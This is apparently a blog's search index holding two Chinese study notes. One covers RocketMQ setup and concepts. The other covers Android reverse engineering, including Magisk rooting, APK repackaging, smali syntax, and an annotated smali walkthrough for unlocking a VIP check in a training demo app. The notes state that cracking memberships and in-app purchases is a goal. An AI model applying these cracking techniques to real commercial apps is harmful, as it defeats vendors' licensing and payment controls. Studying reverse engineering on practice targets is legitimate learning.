<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>RocketMQ学习</title>
    <url>/2024/11/07/RocketMQ%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>学习参考教程：<a href="https://nageoffer.com/docs/rocketmq/">从零到一学习中间件之RocketMQ | 拿个offer-开源&amp;项目实战</a></p>
<span id="more"></span>

<p>[toc]</p>
<h2 id="RocketMQ安装"><a href="#RocketMQ安装" class="headerlink" title="RocketMQ安装"></a>RocketMQ安装</h2><p><a href="https://blog.csdn.net/weixin_50503886/article/details/129680320">RocketMQ的下载与安装（全网最细保姆级别教学）_rocketmq下载安装-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/c20611/article/details/143329688">RocketMQ可视化工具- Dashboard 使用教程 (附带可下载文件)_rokmq可视化工具界面-CSDN博客</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start mqnamesrv.cmd</span><br><span class="line">start mqbroker.cmd -n 127.0.0.1:9876 autoCreateTopicEnable = true</span><br><span class="line">java -jar rocketmq-dashboard-1.0.0.jar --server.port=1280 --rocketmq.config.namesrvAddr=127.0.0.1:9876 &gt; dashboard.log &amp;</span><br><span class="line">http://127.0.0.1:1280/#/</span><br></pre></td></tr></table></figure>



<h2 id="RocketMQ-基础概念"><a href="#RocketMQ-基础概念" class="headerlink" title="RocketMQ 基础概念"></a>RocketMQ 基础概念</h2><h3 id="主题-Topic"><a href="#主题-Topic" class="headerlink" title="主题 Topic"></a>主题 Topic</h3><p>主题是 Apache RocketMQ 中消息传输和存储的顶层容器，用于标识同一类业务逻辑的消息。 主题的作用主要如下：</p>
<ul>
<li><strong>定义数据的分类隔离：</strong> 在 Apache RocketMQ 的方案设计中，建议将不同业务类型的数据拆分到不同的主题中管理，通过主题实现存储的隔离性和订阅隔离性。</li>
<li><strong>定义数据的身份和权限：</strong> Apache RocketMQ 的消息本身是匿名无身份的，同一分类的消息使用相同的主题来做身份识别和权限管理。</li>
</ul>
<h3 id="队列-Queue"><a href="#队列-Queue" class="headerlink" title="队列 Queue"></a>队列 Queue</h3><p>队列是 Apache RocketMQ 中消息存储和传输的实际容器，也是 Apache RocketMQ 消息的最小存储单元。 Apache RocketMQ 的所有主题都是由多个队列组成，以此实现队列数量的水平拆分和队列内部的流式存储。</p>
<h3 id="消息-Message"><a href="#消息-Message" class="headerlink" title="消息 Message"></a>消息 Message</h3><p>消息是 Apache RocketMQ 中的最小数据传输单元。生产者将业务数据的负载和拓展属性包装成消息发送到 Apache RocketMQ 服务端，服务端按照相关语义将消息投递到消费端进行消费。</p>
<h3 id="生产者-Producer"><a href="#生产者-Producer" class="headerlink" title="生产者 Producer"></a>生产者 Producer</h3><p>发布消息的角色。Producer 通过 MQ 的负载均衡模块选择相应的 Broker 集群队列进行消息投递，投递的过程支持快速失败和重试。</p>
<h3 id="消费者-Consumer"><a href="#消费者-Consumer" class="headerlink" title="消费者 Consumer"></a>消费者 Consumer</h3><p>消息消费的角色。</p>
<ul>
<li>支持以推（push），拉（pull）两种模式对消息进行消费。</li>
<li>同时也支持<strong>集群方式</strong>和广播方式的消费。</li>
<li>提供实时消息订阅机制，可以满足大多数用户的需求。</li>
</ul>
<h3 id="名字服务器-NameServer"><a href="#名字服务器-NameServer" class="headerlink" title="名字服务器 NameServer"></a>名字服务器 NameServer</h3><p>NameServer 是一个简单的 Topic 路由注册中心，支持 Topic、Broker 的动态注册与发现。</p>
<p>主要包括两个功能：</p>
<ul>
<li><strong>Broker管理</strong>，NameServer 接受 Broker 集群的注册信息并且保存下来作为路由信息的基本数据。然后提供心跳检测机制，检查 Broker 是否还存活；</li>
<li><strong>路由信息管理</strong>，每个 NameServer 将保存关于 Broker 集群的整个路由信息和用于客户端查询的队列信息。Producer 和 Consumer 通过 NameServer 就可以知道整个 Broker 集群的路由信息，从而进行消息的投递和消费。</li>
</ul>
<p>NameServer 通常会有多个实例部署，各实例间相互不进行信息通讯。Broker 是向每一台 NameServer 注册自己的路由信息，所以每一个 NameServer 实例上面都保存一份完整的路由信息。当某个 NameServer 因某种原因下线了，客户端仍然可以向其它 NameServer 获取路由信息。</p>
<h3 id="代理服务器-Broker"><a href="#代理服务器-Broker" class="headerlink" title="代理服务器 Broker"></a>代理服务器 Broker</h3><p>Broker主要负责消息的存储、投递和查询以及服务高可用保证。</p>
<p>NameServer 几乎无状态节点，因此可集群部署，节点之间无任何信息同步。Broker 部署相对复杂。</p>
<p>在 Master-Slave 架构中，Broker 分为 Master 与 Slave。一个 Master 可以对应多个 Slave，但是一个 Slave 只能对应一个 Master。Master 与 Slave 的对应关系通过指定相同的 BrokerName，不同的 BrokerId 来定义，BrokerId 为 0 表示 Master，非 0 表示 Slave。Master 也可以部署多个。</p>
<p>部署模型小结：</p>
<ul>
<li>每个 <strong>Broker</strong> 与 <strong>NameServer</strong> 集群中的所有节点建立长连接，定时注册 Topic 信息到所有 NameServer。</li>
<li><strong>Producer</strong> 与 <strong>NameServer</strong> 集群中的其中一个节点建立长连接，定期从 NameServer 获取 Topic 路由信息，并向提供 Topic 服务的 Master 建立长连接，且定时向 Master 发送心跳。Producer 完全无状态。</li>
<li><strong>Consumer</strong> 与 <strong>NameServer</strong> 集群中的其中一个节点建立长连接，定期从 NameServer 获取 Topic 路由信息，并向提供 Topic 服务的 Master、Slave 建立长连接，且定时向 Master、Slave 发送心跳。Consumer 既可以从 Master 订阅消息，也可以从 Slave 订阅消息。</li>
</ul>
<h2 id="RocketMQ-工作原理"><a href="#RocketMQ-工作原理" class="headerlink" title="RocketMQ 工作原理"></a>RocketMQ 工作原理</h2><ol>
<li>启动 NameServer</li>
</ol>
<p>启动 NameServer。NameServer 启动后监听端口，等待 Broker、Producer、Consumer 连接，相当于一个路由控制中心。</p>
<ol start="2">
<li>启动 Broker</li>
</ol>
<p>启动 Broker。与所有 NameServer 保持长连接，定时发送心跳包。心跳包中包含当前 Broker 信息以及存储所有 Topic 信息。注册成功后，NameServer 集群中就有 Topic 跟 Broker 的映射关系。</p>
<ol start="3">
<li>创建 Topic</li>
</ol>
<p>创建 Topic 时需要指定该 Topic 要存储在哪些 Broker 上，也可以在发送消息时自动创建 Topic。</p>
<ol start="4">
<li>生产者发送消息</li>
</ol>
<p>生产者发送消息。启动时先跟 NameServer 集群中的其中一台建立长连接，并从 NameServer 中获取当前发送的 Topic 存在于哪些 Broker 上，轮询从队列列表中选择一个队列，然后与队列所在的 Broker 建立长连接从而向 Broker发消息。</p>
<ol start="5">
<li>消费者接受消息</li>
</ol>
<p>消费者接受消息。跟其中一台 NameServer 建立长连接，获取当前订阅 Topic 存在哪些 Broker 上，然后直接跟 Broker 建立连接通道，然后开始消费消息。</p>
<p>常见面试问题：</p>
<p><a href="https://javaguide.cn/high-performance/message-queue/rocketmq-questions.html">RocketMQ常见问题总结 | JavaGuide</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2000463">面渣逆袭：RocketMQ二十三问-腾讯云开发者社区-腾讯云</a></p>
<p><a href="https://blog.csdn.net/ctwctw/article/details/107463884">RocketMQ经典高频面试题大全（附答案）_rocketmq面试题-CSDN博客</a></p>
<p><a href="https://javabetter.cn/sidebar/sanfene/rocketmq.html">消息队列面试题之RocketMQ篇，23道RocketMQ八股文（1.1万字45张手绘图），面渣逆袭必看👍 | 二哥的Java进阶之路</a></p>
<p><a href="https://blog.csdn.net/qq_40522090/article/details/140106704">面试专区|【40道RocketMQ高频题整理(附答案背诵版)】_rocketmq面试题-CSDN博客</a></p>
<p><a href="https://juejin.cn/post/6850418115382738958">使用RocketMQTemplate发送各种消息RocketMQTemplate是spring boot为RocketM - 掘金</a></p>
<h3 id="如何保障消息不丢失"><a href="#如何保障消息不丢失" class="headerlink" title="如何保障消息不丢失"></a>如何保障消息不丢失</h3><p><a href="https://blog.csdn.net/qq_45076180/article/details/113828472">RocketMQ如何保证消息不丢失? 如何快速处理积压消息？_rocketmq 积压数量上限-CSDN博客</a></p>
]]></content>
      <tags>
        <tag>中间件</tag>
      </tags>
  </entry>
  <entry>
    <title>android_study_吴爱破解</title>
    <url>/2023/03/18/android-study/</url>
    <content><![CDATA[<p><a href="https://www.52pojie.cn/thread-648530-1-1.html">《教我兄弟学Android逆向01 编写第一个Android程序》 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>
<p><a href="https://www.52pojie.cn/thread-1695141-1-1.html">https://www.52pojie.cn/thread-1695141-1-1.html</a></p>
<p><a href="https://www.runoob.com/w3cnote/android-tutorial-intro.html">1.0 Android基础入门教程 | 菜鸟教程 (runoob.com)</a></p>
<span id="more"></span>

<h2 id="模拟器环境搭建"><a href="#模拟器环境搭建" class="headerlink" title="模拟器环境搭建"></a>模拟器环境搭建</h2><h3 id="什么是安卓逆向？"><a href="#什么是安卓逆向？" class="headerlink" title="什么是安卓逆向？"></a>什么是安卓逆向？</h3><p>安卓逆向是对已经打包好的APP进行反编译、源码分析了解APP实现逻辑的一门技术</p>
<h3 id="安卓逆向可以干嘛？"><a href="#安卓逆向可以干嘛？" class="headerlink" title="安卓逆向可以干嘛？"></a>安卓逆向可以干嘛？</h3><p>去更新<br>去广告<br>内购&#x2F;会员破解<br>协议自动签到<br>白嫖！！！</p>
<h3 id="Magisk介绍"><a href="#Magisk介绍" class="headerlink" title="Magisk介绍"></a>Magisk介绍</h3><p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://sspai.com/post/67932</span><br><span class="line">https://magiskcn.com/</span><br><span class="line">https://www.52pojie.cn/thread-1583586-1-1.html</span><br><span class="line">https://magiskcn.com/lsposed-instal</span><br></pre></td></tr></table></figure>

<p>Magisk 是一套用于定制 Android 的开源软件，支持高于 Android 5.0 的设备。</p>
<p>以下是一些功能亮点：</p>
<ul>
<li><strong>MagiskSU</strong>：为应用程序提供 root 访问权限</li>
<li><strong>Magisk 模块</strong>：通过安装模块修改只读分区</li>
<li><strong>MagiskHide</strong>：从根检测 &#x2F; 系统完整性检查中隐藏 Magisk(Shamiko)</li>
<li><strong>MagiskBoot</strong> : 最完整的安卓启动镜像解包和重新打包工具</li>
</ul>
<h3 id="学习环境搭建"><a href="#学习环境搭建" class="headerlink" title="学习环境搭建"></a>学习环境搭建</h3><ul>
<li>下载雷电模拟器，开启root权限以及System.vmdk可写入</li>
<li>拖进面具安装，安装至系统分区，出现ALL DONE安装成功</li>
<li>安装lsposed模块</li>
</ul>
<h2 id="APK文件结构、双开、汉化、基础修改"><a href="#APK文件结构、双开、汉化、基础修改" class="headerlink" title="APK文件结构、双开、汉化、基础修改"></a>APK文件结构、双开、汉化、基础修改</h2><p>工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">教程Demo</span><br><span class="line">MT管理器/NP管理器</span><br><span class="line">开发者助手</span><br><span class="line">雷电模拟器</span><br><span class="line">核心破解器（可以按照相同包名不同签名</span><br></pre></td></tr></table></figure>

<h3 id="Apk结构"><a href="#Apk结构" class="headerlink" title="Apk结构"></a>Apk结构</h3><p>apk 全称 Android Package，它相当于一个压缩文件，只要在电脑上将apk后缀改为zip即可解压。</p>
<p>解压后：</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230318203435733.png" alt="image-20230318203435733" style="zoom:25%;" />



<table>
<thead>
<tr>
<th align="center">文件</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">assets目录</td>
<td align="center">存放APK的静态资源文件，比如视频，音频，图片等</td>
</tr>
<tr>
<td align="center">lib 目录</td>
<td align="center">armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件</td>
</tr>
<tr>
<td align="center">META-INF目录</td>
<td align="center">保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改)</td>
</tr>
<tr>
<td align="center">res目录</td>
<td align="center">res目录存放资源文件，包括图片，字符串等等，APK的脸蛋由他的layout文件设计</td>
</tr>
<tr>
<td align="center">AndroidMainfest.xml文件</td>
<td align="center">APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息</td>
</tr>
<tr>
<td align="center">classes.dex文件</td>
<td align="center">classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑</td>
</tr>
<tr>
<td align="center">resources.arsc文件</td>
<td align="center">resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源</td>
</tr>
</tbody></table>
<h3 id="双开及原理"><a href="#双开及原理" class="headerlink" title="双开及原理"></a>双开及原理</h3><p>双开：简单来说，就是手机同时运行两个或多个相同的应用</p>
<p>可以直接使用MT管理器修改包名</p>
<table>
<thead>
<tr>
<th align="center">原理</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">修改包名</td>
<td align="center">让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP</td>
</tr>
<tr>
<td align="center">修改Framework</td>
<td align="center">对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开</td>
</tr>
<tr>
<td align="center">通过虚拟化技术实现</td>
<td align="center">虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间</td>
</tr>
<tr>
<td align="center">以插件机制运行</td>
<td align="center">利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td>
</tr>
</tbody></table>
<h3 id="汉化APK"><a href="#汉化APK" class="headerlink" title="汉化APK"></a>汉化APK</h3><p>汉化：使用专门的工具对外文版的软件资源进行读取、翻译、修改、回写等一系列处理，使软件的菜单、对话框、提示等用户界面显示为中文，而程序的内核和功能保持不变，这个过程即为软件汉化</p>
<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><table>
<thead>
<tr>
<th align="center">属性</th>
<th align="center">定义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">versionCode</td>
<td align="center">版本号，主要用来更新，例如:12</td>
</tr>
<tr>
<td align="center">versionName</td>
<td align="center">版本名，给用户看的，例如:1.2</td>
</tr>
<tr>
<td align="center">package</td>
<td align="center">包名，例如：com.zj.52pj.demo</td>
</tr>
<tr>
<td align="center">uses-permission android:name&#x3D;””</td>
<td align="center">应用权限，例如：android.permission.INTERNET 代表网络权限</td>
</tr>
<tr>
<td align="center">android:label&#x3D;”@string&#x2F;app_name”</td>
<td align="center">应用名称</td>
</tr>
<tr>
<td align="center">android:icon&#x3D;”@mipmap&#x2F;ic_launcher”</td>
<td align="center">应用图标路径</td>
</tr>
<tr>
<td align="center">android:debuggable&#x3D;”true”</td>
<td align="center">应用是否开启debug权限</td>
</tr>
</tbody></table>
<h3 id="eg"><a href="#eg" class="headerlink" title="eg:"></a>eg:</h3><p><a href="https://www.bilibili.com/video/BV1UV411i7sG/">超详细MT管理器改包教程：教你修改包名、名称、版本、图标_哔哩哔哩_bilibili</a></p>
<p>应用双开</p>
<p>修改名字:<a href="https://www.cnblogs.com/wxy13644813114/p/13608281.html">转载-mt管理器修改软件名称（第二课） - 王啸岩 - 博客园 (cnblogs.com)</a></p>
<p>找个英文应用汉化</p>
<p>替换应用的图片：在res中找文件</p>
<h2 id="初识smali，vip终结者"><a href="#初识smali，vip终结者" class="headerlink" title="初识smali，vip终结者"></a>初识smali，vip终结者</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>了解JVM、Dalvik、ART<br>初识smali语法<br>实战修改smali</p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>教程Demo(更新)<br>MT管理器&#x2F;NP管理器<br>雷电模拟器<br>jadx-gui（开源反编译工具<br>核心破解（解决签名问题</p>
<p>smail语法查询</p>
<h3 id="JVM、Dalvik、ART"><a href="#JVM、Dalvik、ART" class="headerlink" title="JVM、Dalvik、ART"></a>JVM、Dalvik、ART</h3><p>JVM是JAVA虚拟机，运行JAVA字节码程序<br>Dalvik是Google专门为Android设计的一个虚拟机，Dalvik有专属的文件执行格式dex(Dalvik executable)<br>Art(Android Runtime)相当于Dalvik的升级版，本质与Dalvik无异</p>
<h3 id="smali及其语法"><a href="#smali及其语法" class="headerlink" title="smali及其语法"></a>smali及其语法</h3><p>参考：</p>
<p><a href="https://blog.csdn.net/lixpjita39/article/details/75193833">Android逆向世界之一:smali文件_smail_逆风Lee的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/l_o_s/article/details/79305253">Smali基本语法(一)_smali注释_岳锋的博客-CSDN博客</a></p>
<p><a href="https://www.chieng.cn/post/169.html">smali语法详解（逆向安卓必学）_文摘_Chieng个人博客</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/379336005">Smali基本语法与指令 - 知乎 (zhihu.com)</a></p>
<p><a href="https://blog.csdn.net/Rozol/article/details/88368358">https://blog.csdn.net/Rozol/article/details/88368358</a></p>
<h4 id="smali文件的结构"><a href="#smali文件的结构" class="headerlink" title="smali文件的结构"></a>smali文件的结构</h4><h5 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">.class &lt;访问权限修饰符&gt; [非权限修饰符] &lt;类名&gt;</span><br><span class="line">.<span class="built_in">super</span> &lt;父类名&gt;</span><br><span class="line">.source &lt;源文件名称&gt;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.class public final Llutey/FTPServer/preferences/PreferencesFactory;</span><br><span class="line">.super Ljava/lang/Object;</span><br><span class="line">.source &quot;PreferencesFactory.java&quot;</span><br></pre></td></tr></table></figure>

<h5 id="接口实现"><a href="#接口实现" class="headerlink" title="接口实现"></a>接口实现</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#interfaces</span><br><span class="line">.implements &lt;接口名称&gt;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># interfaces</span><br><span class="line">.implements Landroid/view/View$OnClickListener;</span><br></pre></td></tr></table></figure>

<h5 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#annotations</span><br><span class="line">.annotation [注解的属性] &lt;注解类名&gt;</span><br><span class="line">    [注解字段=值]</span><br><span class="line">    ...</span><br><span class="line">.end annotation</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># annotations</span><br><span class="line">.annotation build Landroid/annotation/TargetApi;</span><br><span class="line">    value = 0xb</span><br><span class="line">.end annotation</span><br></pre></td></tr></table></figure>

<h5 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h5><p>使用.field描述字段的定义，分为静态变量和普通变量两种：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#static fields</span><br><span class="line">.field &lt;访问权限&gt; static [修饰词] &lt;字段名&gt;:&lt;变量类型&gt;</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># static fields</span><br><span class="line">.field public static mStr:Ljava/lang/String;</span><br></pre></td></tr></table></figure>



<h4 id="常用指令1"><a href="#常用指令1" class="headerlink" title="常用指令1"></a>常用指令1</h4><table>
<thead>
<tr>
<th align="center">名称</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">.class</td>
<td align="center">类名</td>
</tr>
<tr>
<td align="center">.super</td>
<td align="center">父类名，继承的上级类名名称</td>
</tr>
<tr>
<td align="center">.source</td>
<td align="center">源名</td>
</tr>
<tr>
<td align="center">.field</td>
<td align="center">变量</td>
</tr>
<tr>
<td align="center">.method</td>
<td align="center">方法名</td>
</tr>
<tr>
<td align="center">.register</td>
<td align="center">寄存器</td>
</tr>
<tr>
<td align="center">.end method</td>
<td align="center">方法名的结束</td>
</tr>
<tr>
<td align="center">public</td>
<td align="center">公有</td>
</tr>
<tr>
<td align="center">protected</td>
<td align="center">半公开，只有同一家人才能用</td>
</tr>
<tr>
<td align="center">private</td>
<td align="center">私有，只能自己使用</td>
</tr>
<tr>
<td align="center">.parameter</td>
<td align="center">方法参数</td>
</tr>
<tr>
<td align="center">.prologue</td>
<td align="center">方法开始</td>
</tr>
<tr>
<td align="center">.line xxx</td>
<td align="center">位于第xxx行</td>
</tr>
<tr>
<td align="center">.annotation&#x2F;.end annotation</td>
<td align="center"></td>
</tr>
</tbody></table>
<h4 id="数据类型对应"><a href="#数据类型对应" class="headerlink" title="数据类型对应"></a>数据类型对应</h4><table>
<thead>
<tr>
<th align="center">smali类型</th>
<th align="center">java类型</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">V</td>
<td align="center">void</td>
<td align="center">无返回值</td>
</tr>
<tr>
<td align="center">Z</td>
<td align="center">boolean</td>
<td align="center">布尔值类型，返回0或1</td>
</tr>
<tr>
<td align="center">B</td>
<td align="center">byte</td>
<td align="center">字节类型，返回字节</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">short</td>
<td align="center">短整数类型，返回数字</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">char</td>
<td align="center">字符类型，返回字符</td>
</tr>
<tr>
<td align="center">I</td>
<td align="center">int</td>
<td align="center">整数类型，返回数字</td>
</tr>
<tr>
<td align="center">J</td>
<td align="center">long （64位 需要2个寄存器存储）</td>
<td align="center">长整数类型，返回数字</td>
</tr>
<tr>
<td align="center">F</td>
<td align="center">float</td>
<td align="center">单浮点类型，返回数字</td>
</tr>
<tr>
<td align="center">D</td>
<td align="center">double （64位 需要2个寄存器存储）</td>
<td align="center">双浮点类型，返回数字</td>
</tr>
<tr>
<td align="center">string</td>
<td align="center">String</td>
<td align="center">文本类型，返回字符串</td>
</tr>
<tr>
<td align="center">Lxxx&#x2F;xxx&#x2F;xxx</td>
<td align="center">object</td>
<td align="center">对象类型，返回对象</td>
</tr>
</tbody></table>
<h4 id="常用指令2"><a href="#常用指令2" class="headerlink" title="常用指令2"></a>常用指令2</h4><table>
<thead>
<tr>
<th align="center">关键字</th>
<th align="center">注释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">const</td>
<td align="center">重写整数属性，真假属性内容，只能是数字类型</td>
</tr>
<tr>
<td align="center">const-string</td>
<td align="center">重写字符串内容</td>
</tr>
<tr>
<td align="center">const-wide</td>
<td align="center">重写长整数类型，多用于修改到期时间。</td>
</tr>
<tr>
<td align="center">return</td>
<td align="center">返回指令</td>
</tr>
<tr>
<td align="center">if-eq</td>
<td align="center">全称equal(a&#x3D;b)，比较寄存器ab内容，相同则跳</td>
</tr>
<tr>
<td align="center">if-ne</td>
<td align="center">全称not equal(a!&#x3D;b)，ab内容不相同则跳</td>
</tr>
<tr>
<td align="center">if-eqz</td>
<td align="center">全称equal zero(a&#x3D;0)，z即是0的标记，a等于0则跳</td>
</tr>
<tr>
<td align="center">if-nez</td>
<td align="center">全称not equal zero(a!&#x3D;0)，a不等于0则跳</td>
</tr>
<tr>
<td align="center">if-ge</td>
<td align="center">全称greater equal(a&gt;&#x3D;b)，a大于或等于则跳</td>
</tr>
<tr>
<td align="center">if-le</td>
<td align="center">全称little equal(a&lt;&#x3D;b)，a小于或等于则跳</td>
</tr>
<tr>
<td align="center">goto</td>
<td align="center">强制跳到指定位置</td>
</tr>
<tr>
<td align="center">switch</td>
<td align="center">分支跳转，一般会有多个分支线，并根据指令跳转到适当位置</td>
</tr>
<tr>
<td align="center">iget</td>
<td align="center">获取寄存器数据</td>
</tr>
</tbody></table>
<h4 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器:"></a>寄存器:</h4><p>在smali里的所有操作都必须经过寄存器来进行:本地寄存器用v开头数字结尾的符号来表示，如v0、 v1、v2。 参数寄存器则使用p开头数字结尾的符号来表示，如p0、p1、p2。特别注意的是，p0不一定是函数中的第一个参数，在非static函数中，p0代指“this”，p1表示函数的第一个 参数，p2代表函数中的第二个参数。而在static函数中p0才对应第一个参数(因为Java的static方法中没有this方法）</p>
<h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>本次学习使用的demo为修改一app使其能够一来就有大会员。</p>
<h4 id="jadx-gui寻找目标位置"><a href="#jadx-gui寻找目标位置" class="headerlink" title="jadx-gui寻找目标位置"></a>jadx-gui寻找目标位置</h4><p>打开文件</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319110933178.png" alt="image-20230319110933178" style="zoom:67%;" />

<p>jadx-gui搜索关键字符串：大会员</p>
<img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319111126434.png" alt="image-20230319111126434" style="zoom:50%;" />

<p>找到对应位置了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//一个私有、静态、不可变的方法   方法名</span><br><span class="line">.method private static final onCreate$lambda-2(Lkotlin/jvm/internal/Ref$IntRef;Lcom/zj/wuaipojie/ui/ChallengeSecond;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/widget/ImageView;Landroid/view/View;)Z //(这里面是方法的参数)这里是方法返回值类型，表示布尔值类型，返回假或真</span><br><span class="line">    .registers 7  //寄存器数量</span><br><span class="line"></span><br><span class="line">    .line 33  //代码所在的行数</span><br><span class="line">    iget p0, p0, Lkotlin/jvm/internal/Ref$IntRef;-&gt;element:I  //读取p0(第一个参数，参考寄存器知识)中element的值赋值给p0</span><br><span class="line"></span><br><span class="line">    const/4 p5, 0x1  //p5赋值1</span><br><span class="line"></span><br><span class="line">    const/16 v0, 0xa //v0赋值10，在16进制里a表示10</span><br><span class="line"></span><br><span class="line">    if-ge p0, v0, :cond_15  //判断p0的值是否大于或等于v0的值(即p0的值是否大于或等于10)，如果大于或等于则跳转到:cond_15</span><br><span class="line"></span><br><span class="line">    .line 34  //以下是常见的Toast弹窗代码</span><br><span class="line">    check-cast p1, Landroid/content/Context; //检查Context对象引用</span><br><span class="line"></span><br><span class="line">    const-string p0, &quot;请先获取10个硬币哦&quot; //弹窗文本信息，把&quot;&quot;里的字符串数据赋值给p0</span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence; //检查CharSequence对象引用</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p1, p0, p5&#125;, Landroid/widget/Toast;-&gt;makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast; </span><br><span class="line">    //将弹窗文本、显示时间等信息传给p1</span><br><span class="line"></span><br><span class="line">    move-result-object p0  //结果传递给p0</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0&#125;, Landroid/widget/Toast;-&gt;show()V  //当看到这个Toast;-&gt;show你就应该反应过来这里是弹窗代码</span><br><span class="line"></span><br><span class="line">    goto :goto_31  //跳转到:goto_31</span><br><span class="line"></span><br><span class="line">    :cond_15 //跳转的一个地址</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Lcom/zj/wuaipojie/ui/ChallengeSecond;-&gt;isvip()Z  //判断isvip方法的返回值是否为真(即结果是否为1)</span><br><span class="line"></span><br><span class="line">    move-result p0  //结果赋值给p0</span><br><span class="line"></span><br><span class="line">    if-eqz p0, :cond_43 //如果结果为0则跳转cond_43地址</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d0018  //在arsc中的id索引，这个值可以进行查询</span><br><span class="line"></span><br><span class="line">    .line 37</span><br><span class="line">    invoke-virtual &#123;p2, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V //设置图片资源</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d0008</span><br><span class="line"></span><br><span class="line">    .line 38</span><br><span class="line">    invoke-virtual &#123;p3, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    const p0, 0x7f0d000a</span><br><span class="line"></span><br><span class="line">    .line 39</span><br><span class="line">    invoke-virtual &#123;p4, p0&#125;, Landroid/widget/ImageView;-&gt;setImageResource(I)V</span><br><span class="line"></span><br><span class="line">    .line 40</span><br><span class="line">    sget-object p0, Lcom/zj/wuaipojie/util/SPUtils;-&gt;INSTANCE:Lcom/zj/wuaipojie/util/SPUtils; </span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const/4 p2, 0x2 //p2赋值2</span><br><span class="line"></span><br><span class="line">    const-string p3, &quot;level&quot; //sp的索引</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;p0, p1, p3, p2&#125;, Lcom/zj/wuaipojie/util/SPUtils;-&gt;saveInt(Landroid/content/Context;Ljava/lang/String;I)V //写入数据</span><br><span class="line"></span><br><span class="line">    goto :goto_50 //跳转地址</span><br><span class="line"></span><br><span class="line">    :cond_43</span><br><span class="line"></span><br><span class="line">    check-cast p1, Landroid/content/Context;</span><br><span class="line"></span><br><span class="line">    const-string p0, &quot;\u8bf7\u5148\u5145\u503c\u5927\u4f1a\u5458\u54e6\uff01&quot; //请先充值大会员哦！</span><br><span class="line"></span><br><span class="line">    check-cast p0, Ljava/lang/CharSequence;</span><br><span class="line"></span><br><span class="line">    invoke-static &#123;p1, p0, p5&#125;, 